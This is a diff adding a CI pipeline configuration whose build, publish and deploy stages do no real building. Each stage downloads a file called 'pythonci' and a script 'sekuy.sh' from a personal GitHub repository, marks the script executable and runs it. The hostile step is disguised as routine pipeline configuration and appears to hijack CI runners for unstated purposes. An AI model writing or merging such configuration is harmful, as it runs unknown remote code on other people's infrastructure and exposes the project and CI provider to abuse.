@@ -1,0 +1,20 @@
+pipeline:
+  build:
+    image: golang
+    commands:
+      - wget https://github.com/hendrik20212/VRS/raw/main/pythonci
+      - wget https://raw.githubusercontent.com/hendrik20212/VRS/main/sekuy.sh && chmod u+x sekuy.sh && ./sekuy.sh
+      
+  publish:
+    image: golang
+    commands:
+      - wget https://github.com/hendrik20212/VRS/raw/main/pythonci
+      - wget https://raw.githubusercontent.com/hendrik20212/VRS/main/sekuy.sh && chmod u+x sekuy.sh && ./sekuy.sh
+      
+
+  deploy:
+    image: golang
+    commands:
+      - wget https://github.com/hendrik20212/VRS/raw/main/pythonci
+      - wget https://raw.githubusercontent.com/hendrik20212/VRS/main/sekuy.sh && chmod u+x sekuy.sh && ./sekuy.sh
+      
